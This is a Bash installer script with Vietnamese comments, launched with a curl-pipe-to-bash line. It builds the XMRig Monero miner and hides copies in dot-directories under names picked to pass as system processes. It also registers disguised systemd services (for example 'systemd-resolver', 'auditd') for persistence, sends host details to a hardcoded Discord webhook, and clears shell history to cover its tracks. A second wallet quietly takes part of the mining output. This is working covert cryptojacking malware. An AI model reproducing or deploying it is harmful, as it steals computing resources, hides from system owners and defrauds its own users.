#!/bin/bash
# ghi hết đoạn dưới này ( nhớ bỏ dấu "#" )

# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)


# ========== CONFIG ==========
WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
# ========== END CONFIG ==========

WORKER1="core_$(hostname)_$(shuf -i 1000-9999 -n1)"
WORKER2="silent_$(hostname)_$(shuf -i 1000-9999 -n1)"

TOTALCORE=$(nproc)
TOTAL_MINING_THREADS=$TOTALCORE
THREADS1=$(shuf -i 5-7 -n1)
THREADS2=$((TOTAL_MINING_THREADS - THREADS1))

PRIORITY=3
NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
DIR1="$HOME/.local/share/.cache/.dbus1"
DIR2="$HOME/.local/share/.cache/.dbus2"
SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
LOG1="/tmp/xmrig-log1.log"
LOG2="/tmp/xmrig-log2.log"
KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"



echo "🚀 Đang cài đặt XMRig"
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
# Clone và build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORE

# Copy file binary
mkdir -p "$DIR1" "$DIR2"
cp ./xmrig "$DIR1/$NAME1"
cp ./xmrig "$DIR2/$NAME2"
chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"

# Tạo systemd cho tiến trình
sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
[Unit]
Description=Core Miner Fallback
After=network.target

[Service]
ExecStart=$DIR1/$NAME1 -o $POOL -u $WALLET.$WORKER1 -k --coin monero --tls \\
  --cpu-priority=$PRIORITY --threads=$THREADS1 --donate-level=0 \\
  --max-cpu-usage=65 --log-file=$LOG1
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF
sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
[Unit]
Description=Core Miner
After=network.target

[Service]
ExecStart=$DIR2/$NAME2 -o $POOL -u $KEY.$WORKER2 -k --coin monero --tls \\
  --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
  --max-cpu-usage=65 --log-file=$LOG2
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt cả service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE1
sudo systemctl enable $SERVICE2
sudo systemctl start $SERVICE1
sudo systemctl start $SERVICE2

# Tạo script gửi log tiến trình 1 về Discord
tee "$DIR1/logminer.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
PROCESS_NAME="$NAME1"
HOST="\$(hostname)"

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
THREADS=$THREADS1

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"XMRig Status\\",
  \\"content\\": \\"🖥️ \\\`\$HOST\\\` Connected\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$DIR1/logminer.sh"
"$DIR1/logminer.sh"

# Xoá dấu vết
cd ~
rm -rf xmrig
history -c

echo ""
echo "✅ Đang đào  🚀"

# Cài htop nếu chưa có
if ! command -v htop >/dev/null 2>&1; then
    echo "📦 Đang cài đặt htop"
    sudo apt install -y htop
fi
exec htop
